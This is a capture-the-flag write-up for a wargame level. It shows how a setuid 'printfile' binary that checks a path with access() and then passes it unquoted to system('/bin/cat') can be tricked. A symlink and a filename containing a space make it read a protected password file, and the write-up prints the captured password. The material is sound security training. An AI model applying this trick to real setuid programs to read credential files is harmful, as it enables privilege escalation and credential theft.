# Leviathan2

See `./printfile`

Looks like it prints a file. Try to print `./printfile /etc/leviathan_pass/leviathan3`

Nope no permission.

Try to see library calls it's making on a file it can access:

`ltrace ./printfile ./bashrc`

```
__libc_start_main(0x80491e6, 2, 0xffffd5b4, 0 <unfinished ...>
access(".bashrc", 4)                                             = 0
snprintf("/bin/cat .bashrc", 511, "/bin/cat %s", ".bashrc")      = 16
geteuid()                                                        = 12002
geteuid()                                                        = 12002
setreuid(12002, 12002)                                           = 0
system("/bin/cat .bashrc"# ~/.bashrc: executed by bash(1) for non-login shells.
```

Note that it checks file for access, escalates permissions, then shells out to `/bin/cat`

Can we redirect by using a link? 

```
ln -s /etc/leviathan_pass/leviathan3 /tmp/link
./printfile /tmp/link
```

Nope it checks permissions 



Can we try break the binary? 

If we provide two inputs what happens?
```
ltrace ./printfile .bashrc .profile
```

Only first input is checked

If we provide a space in the name of the file?

```
leviathan2@gibson:~$ mktemp
/tmp/tmp.EfD34m4mLC
leviathan2@gibson:~$ mktemp | xargs touch
leviathan2@gibson:~$ touch "/tmp/whoa file.txt"
leviathan2@gibson:~$ cat "/tmp/whoa file.txt"
leviathan2@gibson:~$ file "/tmp/whoa file.txt"
/tmp/whoa file.txt: empty
leviathan2@gibson:~$ ./printfile "/tmp/whoa file.txt"
/bin/cat: /tmp/whoa: No such file or directory
/bin/cat: file.txt: No such file or directory
```

Whole file is checked, but only last word after space is read

Let's create a file with a space such that one of the words is the previous link

```
leviathan2@gibson:~$ touch "/tmp/link whoa"
leviathan2@gibson:~$ ./printfile "/tmp/link whoa"
Q0G8j4sakn
/bin/cat: whoa: No such file or directory
```
